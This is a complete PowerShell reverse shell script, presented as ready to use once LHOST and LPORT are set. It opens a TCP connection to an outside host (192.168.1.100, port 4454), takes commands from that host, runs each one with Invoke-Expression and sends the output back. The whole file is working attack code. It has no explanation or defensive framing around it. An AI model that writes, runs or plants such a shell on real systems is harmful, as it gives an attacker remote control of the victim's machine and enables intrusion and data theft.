# PowerShell Advanced Reverse Shell
# Configure LHOST and LPORT before use

$LHOST = "192.168.1.100"
$LPORT = 4454

$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()

$buffer = New-Object byte[] 1024
while ($true) {
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
    if ($bytesRead -eq 0) { break }

    $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    if ($command -eq "exit") { break }

    $output = Invoke-Expression $command 2>&1
    $stream.Write([System.Text.Encoding]::ASCII.GetBytes($output), 0, $output.Length)
}

$stream.Close()
$client.Close()
